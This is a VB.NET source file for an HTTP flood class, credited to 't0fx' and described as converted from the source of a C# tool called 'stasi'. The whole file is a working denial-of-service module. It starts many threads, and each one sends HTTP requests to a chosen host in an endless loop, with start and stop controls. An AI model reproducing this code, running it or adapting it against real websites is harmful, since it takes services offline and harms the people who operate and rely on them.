Imports System
Imports System.Net
Imports System.Threading

'HTTPflood class exemple by t0fx, converted and modded from C# stasi source


Friend Class HttpFloods
    Private Shared _floodingJob As ThreadStart()
    Private Shared _floodingThread As Thread()
    Public Shared Host As String
    Public Shared Interval As Integer
    Public Shared IsEnabled As Boolean
    Private Shared _requestClass As HttpRequest()
    Public Shared Threads As Integer

    Public Shared Sub StartHttpFlood()
        _floodingThread = New Thread(Threads - 1) {}
        _floodingJob = New ThreadStart(Threads - 1) {}
        _requestClass = New HttpRequest(Threads - 1) {}
        For i As Integer = 0 To Threads - 1
            _requestClass(i) = New HttpRequest(Host, Interval)
            _floodingJob(i) = New ThreadStart(AddressOf _requestClass(i).Send)
            _floodingThread(i) = New Thread(_floodingJob(i))
            _floodingThread(i).Start()
        Next
        IsEnabled = True
    End Sub

    Public Shared Sub StopHttpFlood()
        For i As Integer = 0 To Threads - 1
            Try
                _floodingThread(i).Abort()
                _floodingThread(i) = Nothing
                _floodingJob(i) = Nothing
                _requestClass(i) = Nothing
            Catch p As Exception
            End Try
        Next
        IsEnabled = False
    End Sub

    Private Class HttpRequest
        Private Host As String
        Private Http As New WebClient()
        Private Interval As Integer

        Public Sub New(ByVal Host As String, ByVal Interval As Integer)
            Me.Host = Host
            Me.Interval = Interval
        End Sub

        Public Sub Send()
            While True
                Try
                    Http.DownloadString(Host)
                    Thread.Sleep(Interval)
                Catch
                    Thread.Sleep(Interval)
                End Try
            End While
        End Sub
    End Class
End Class

